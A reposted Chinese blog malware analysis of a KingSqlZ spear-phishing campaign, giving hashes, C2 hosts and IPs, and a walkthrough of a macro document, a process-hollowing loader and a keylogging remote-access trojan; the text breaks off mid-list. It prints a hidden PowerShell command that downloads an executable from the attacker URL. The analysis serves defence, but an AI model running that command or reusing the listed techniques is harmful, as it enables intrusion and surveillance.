<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="findream's blog" type="application/atom+xml" />






<meta name="description" content="0x0 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3">
<meta property="og:type" content="article">
<meta property="og:title" content="针对KingSqlZ组织一次攻击的分析报告">
<meta property="og:url" content="https://findream.github.io/2019/05/30/病毒分析技术_21_针对KingSqlZ组织一次攻击的分析报告/index.html">
<meta property="og:site_name" content="findream&#39;s blog">
<meta property="og:description" content="0x0 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://hacky.wang/blog/20190530/zfiD0zF422xh.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/NMcvDW1urtq1.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/l2Ice0RMALU1.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/rkhvbmpQjVhj.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/u09pkDcBrOJm.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/wR9hnpBJDbgA.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/mp7iQpXKuVJS.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/2gGU9cAKIwzX.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/bUiMGz4QEXFt.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/3oiXdAdSpEXy.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/lKj49BU7dEGh.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/ALsYol1VFhuN.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/lybJLCwmYw1P.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/wUI0RvgdTI3u.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/4BYRLn86fTlC.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/LqlaGfeqXxjp.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/Ue0MCgcw2SuL.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/Ke9KPR9QMmPE.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/qD0A3MylalqU.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/DxqaAw6ecywb.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/7F5srRvuzn0v.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/CGxKazGvJTT3.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/yR8IoRHbpfTh.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/bwfBwvH3izqg.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/NqOv2wDPzsuM.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/MJ2nzNziucMo.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/NBjXKoTsQtxs.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/HCE8Qibkbqgn.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/htwCe5roCz9E.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/eBifkMoWRjBW.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/Bfkpo0S2QVE4.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/FFjpLz4J43FX.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/pYLAhPk3gBQf.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/mhIdck9OnGao.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/oOK0pcOh4ihn.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/xTgtjda9jv14.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/RY3FfWB9h30L.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/UIiP1XJeuXdw.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/ECdPKzU9Lxt9.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/X1nCzCbVrg03.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/wtWgKpNdbMpJ.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/BDFdEqEMSBTB.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/vgx2dLTQ52uX.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/HxEReejnTbhM.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/weGL22cJNAxS.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/MD6BA3jtt83K.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/7bKJHwCaBzoO.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/CxyVqwMOJysO.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/2OIjOJJO2bjn.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/tDqH0qJrmyse.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/izfY42GDjtxG.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/PbEFY4NVxBxL.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/WARLNynOQVC7.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/RTpRqfT9lrz4.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/v1XfIa4p0EgQ.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/Ar9bAD4GBcwQ.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190530/XBHWFk2lgFEr.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/JnFcBdvpEuNj.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/LuJRzBbnOqD9.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/Np5Pu9zW5rXd.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/0LCl60fJ1Om7.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/wsmMrrrwPYBU.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/wm7wdh5PKRs9.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/3VhJKujgaWxF.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/3zNC6Iv8TbyU.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/jHs9TptLnXU1.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/zoLRanmKhcXJ.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/7GeLBDmIARA1.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/A2sUFO3xp63G.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/SzfW0vNHmgMX.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/bjEvbMaP086q.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/SPgBynQXWoWV.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/oezl9Ao1Mxjq.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/ia62OMkAyqt1.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/PYQS3fKxCVvl.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/9JBlteNf771m.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/t0Vcy7E3vTn3.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/XTmksNUFolcU.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/ov8jtKnIDlq1.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/FhlkNdjSbCpI.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/T7fbWQtCDoet.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/OXR5A7GOrBVQ.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/3ERiffs6sFkT.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/KXFIlim7xvcJ.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190531/MCoNO1kE6J0A.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20190601/YxECxIiG24Nw.png?imageslim">
<meta property="og:updated_time" content="2021-11-02T13:55:21.845Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="针对KingSqlZ组织一次攻击的分析报告">
<meta name="twitter:description" content="0x0 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3">
<meta name="twitter:image" content="http://hacky.wang/blog/20190530/zfiD0zF422xh.png?imageslim">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://findream.github.io/2019/05/30/病毒分析技术_21_针对KingSqlZ组织一次攻击的分析报告/"/>





  <title>针对KingSqlZ组织一次攻击的分析报告 | findream's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">findream's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-schedule">
          <a href="/schedule/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
            
            日程表
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      
        
        <li class="menu-item menu-item-commonweal">
          <a href="/404/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
            
            公益404
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2019/05/30/病毒分析技术_21_针对KingSqlZ组织一次攻击的分析报告/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="findream">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="findream's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">针对KingSqlZ组织一次攻击的分析报告</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-30T15:02:11+08:00">
                2019-05-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/windows安全/" itemprop="url" rel="index">
                    <span itemprop="name">windows安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3千多个网站服务器，并高调的在被攻击网站上留下其组织的名称，随后消失了多年。 如今通过研究人员的追踪再次挖出该黑客组织的活动迹象。此次攻击活动通过构造恶意Office Word文档并配合鱼叉邮件发起定向攻击，以“简历更新”作为诱饵文档向攻击目标植入间谍木马，从事情报收集、远控监视及系统破坏等恶意行动。在本次攻击过程中，该组织采用渗透手段攻下多台服务器并将其作为存放攻击代码的跳板。[转]<br><a id="more"></a></p>
<h1 id="0x1-目录"><a href="#0x1-目录" class="headerlink" title="0x1 目录"></a>0x1 目录</h1><ul>
<li>1.目录</li>
<li>2.IoC</li>
<li>3.行为分析</li>
<li>4.样本分析</li>
<li>5.yara规则</li>
<li>6.后记</li>
</ul>
<h1 id="0x2-IoC"><a href="#0x2-IoC" class="headerlink" title="0x2 IoC"></a>0x2 IoC</h1><h2 id="0x2-1-Hash"><a href="#0x2-1-Hash" class="headerlink" title="0x2.1 Hash"></a>0x2.1 Hash</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本次一共截获了两个和<code>KingSqlZ</code>组织有关的可疑样本，其中有一个是一个doc样本，通过使用宏进行文件传播，IOC如下：</p>
<ul>
<li>样本名称：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810.doc</li>
<li>样本Hash：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810</li>
<li>样本类型：ole文件(带宏)</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外一个是一个PE文件。IOC如下：</p>
<ul>
<li>样本名称：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f.exe</li>
<li>样本Hash：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f</li>
<li>是否加壳：无壳</li>
<li>编译语言：maybe C++ Visual Studio 201x or Asm demo/example  [DebuG]</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以及这两个样本释放的其他样本的IOC(不包括内存转储): </p>
<ul>
<li>2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47</li>
<li>9211473ae545a0248b4ef4bb1bea1acffc1ec85ecb42194984266416720a7f73</li>
<li>c242bfb6aa6d47087d77d25955bd48a5421fb0353049828ec99d44e119874b7a</li>
<li>7a01dd19b5a74e7023d19a19065f49fb013c9f0f7fee974d717d46a8369b8e60</li>
</ul>
<h2 id="0x2-2-C2"><a href="#0x2-2-C2" class="headerlink" title="0x2.2 C2"></a>0x2.2 C2</h2><ul>
<li><a href="http://www.gestomarket.co/ylqrg54.exe" target="_blank" rel="external">http://www.gestomarket.co/ylqrg54.exe</a></li>
<li>asdfwrkhl.warzonedns.com</li>
<li>linksysdatakeys.se</li>
<li>67.228.235.93</li>
<li>187.136.91.177</li>
<li>187.155.84.184</li>
<li>31.13.73.17</li>
<li>67.228.235.93</li>
<li>31.13.73.23</li>
<li>74.86.228.110</li>
<li>187.155.84.184</li>
<li>69.171.239.11</li>
<li>187.155.47.67</li>
<li>66.220.147.47</li>
<li>31.13.86.1</li>
<li>31.13.75.17:2404</li>
<li>备注：这些主机本身不具备相关性，因为他们都是由于被该组织渗透成为该组织攻击的跳板</li>
</ul>
<h1 id="0x3-行为分析"><a href="#0x3-行为分析" class="headerlink" title="0x3 行为分析"></a>0x3 行为分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;名称统一使用Hash的前几个字符加后缀的方式命名。主要操作是远控类木马。<br>    <img src="http://hacky.wang/blog/20190530/zfiD0zF422xh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/NMcvDW1urtq1.png?imageslim" alt="mark"></p>
<h1 id="0x4-样本分析"><a href="#0x4-样本分析" class="headerlink" title="0x4 样本分析"></a>0x4 样本分析</h1><h2 id="0x4-1-4fb430-doc"><a href="#0x4-1-4fb430-doc" class="headerlink" title="0x4.1 4fb430.doc"></a>0x4.1 4fb430.doc</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是一个doc宏病毒样本，通过使用oledump获取其中的宏代码。<br>    <img src="http://hacky.wang/blog/20190530/l2Ice0RMALU1.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发现宏代码被混淆严重，去混淆结合沙箱的结果推测具体行为如下：</p>
<ul>
<li>宏代码调用cmd，解密其中的十进制数据。</li>
<li><p>接着调用powershell。下载massive.exe</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">powershell</span><span class="selector-class">.exe</span> <span class="selector-tag">-w</span> <span class="selector-tag">hidden</span> <span class="selector-tag">-ep</span> <span class="selector-tag">bypass</span> (New-Object System.Net.WebClient)<span class="selector-class">.DownloadFile</span>(<span class="string">'http://www.gestomarket.co/ylqrg54.exe'</span>,$<span class="attribute">env</span>:temp + <span class="string">'\massive.exe'</span>);</div></pre></td></tr></table></figure>
</li>
<li><p>运行massive.exe</p>
</li>
</ul>
<h2 id="0x4-2-massive-exe"><a href="#0x4-2-massive-exe" class="headerlink" title="0x4.2 massive.exe"></a>0x4.2 massive.exe</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先这个样本是一个C#程序，使用ILSpy查看源代码。<br>    <img src="http://hacky.wang/blog/20190530/rkhvbmpQjVhj.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将程序定位到关键的地方。发现这个样本也只是一个外壳程序，用于从攻击跳板上获取攻击代码，然后将其写入我们的内存中，从内存中执行攻击代码，实现了无文件落地，有效规避了查杀。<br>    <img src="http://hacky.wang/blog/20190530/u09pkDcBrOJm.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/wR9hnpBJDbgA.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用进程替换技术，先创建一个和自身相同的子进程，然后使用进程替换进程，执行我们的攻击代码。但是由于C#不好被调试，所以将其子进程转储得到我们落地的攻击样本如下，命名为DumpFrommassive.exe<br>    <img src="http://hacky.wang/blog/20190530/mp7iQpXKuVJS.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/2gGU9cAKIwzX.png?imageslim" alt="mark"></p>
<h2 id="0x4-3-DumpFrommassive-exe"><a href="#0x4-3-DumpFrommassive-exe" class="headerlink" title="0x4.3 DumpFrommassive.exe"></a>0x4.3 DumpFrommassive.exe</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建一个互斥体，然后获取多个API函数地址<br>    <img src="http://hacky.wang/blog/20190530/bUiMGz4QEXFt.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着判断是否是X64系统，然后通过注册表<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName</code>获取系统的版本信息。<br>    <img src="http://hacky.wang/blog/20190530/3oiXdAdSpEXy.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当判断是xp系统，就去获取HKEY_CURRENT_USER\origmsc数据，但是分析机器上未发现这样的键。<br>    <img src="http://hacky.wang/blog/20190530/lKj49BU7dEGh.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用注册表HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System 关闭UAC通知<br>    <img src="http://hacky.wang/blog/20190530/ALsYol1VFhuN.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过当前的环境变量获取特殊目录的路径<br>    <img src="http://hacky.wang/blog/20190530/lybJLCwmYw1P.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取目标进程的相关信息包括模块和32/64位进程，这个进程是由于注册表中的数据决定。<br>    <img src="http://hacky.wang/blog/20190530/wUI0RvgdTI3u.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于转储很多静态数据丢失，过于细节的数据没有办法复现。<br>    <img src="http://hacky.wang/blog/20190530/4BYRLn86fTlC.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/LqlaGfeqXxjp.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/Ue0MCgcw2SuL.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于该组织使用渗透的方式，得到多台服务器的控制权，让这些服务器充当此次攻击的跳板机和C2<br>    <img src="http://hacky.wang/blog/20190530/Ke9KPR9QMmPE.png?imageslim" alt="mark"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过设置键盘钩子的形式，记录键盘输入，和剪切板数据<br>    <img src="http://hacky.wang/blog/20190530/qD0A3MylalqU.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/DxqaAw6ecywb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/7F5srRvuzn0v.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/CGxKazGvJTT3.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建新线程，执行截图<br>    <img src="http://hacky.wang/blog/20190530/yR8IoRHbpfTh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/bwfBwvH3izqg.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/NqOv2wDPzsuM.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/MJ2nzNziucMo.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建新线程进行音视频传输<br>    <img src="http://hacky.wang/blog/20190530/NBjXKoTsQtxs.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;清空主流浏览器的COOKIE和保存的表单(账户和密码)，这样就可以在用户重新输入密码的时候记录下来。<br>    <img src="http://hacky.wang/blog/20190530/HCE8Qibkbqgn.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/htwCe5roCz9E.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取用户名，机器名称，主要是识别作用<br>    <img src="http://hacky.wang/blog/20190530/eBifkMoWRjBW.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关闭数据执行保护DEP<br>    <img src="http://hacky.wang/blog/20190530/Bfkpo0S2QVE4.png?imageslim" alt="mark"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行后门远控操作，主要的行为有键盘记录，截图，视频，发送数据，联网下载数据，检索服务，创建开启服务，程序执行，傀儡进程，提权关机。</p>
<ul>
<li>提权关机<br>  <img src="http://hacky.wang/blog/20190530/FFjpLz4J43FX.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/pYLAhPk3gBQf.png?imageslim" alt="mark"></li>
<li>键盘记录<br>  <img src="http://hacky.wang/blog/20190530/mhIdck9OnGao.png?imageslim" alt="mark"></li>
<li>发送键盘输入数据<br>  <img src="http://hacky.wang/blog/20190530/oOK0pcOh4ihn.png?imageslim" alt="mark"></li>
<li>安装软件信息，并发送<br>  <img src="http://hacky.wang/blog/20190530/xTgtjda9jv14.png?imageslim" alt="mark"></li>
<li>从Internet上读取可执行的shellcode，并执行<br>  <img src="http://hacky.wang/blog/20190530/RY3FfWB9h30L.png?imageslim" alt="mark"></li>
<li>获取进程列表<br>  <img src="http://hacky.wang/blog/20190530/UIiP1XJeuXdw.png?imageslim" alt="mark"></li>
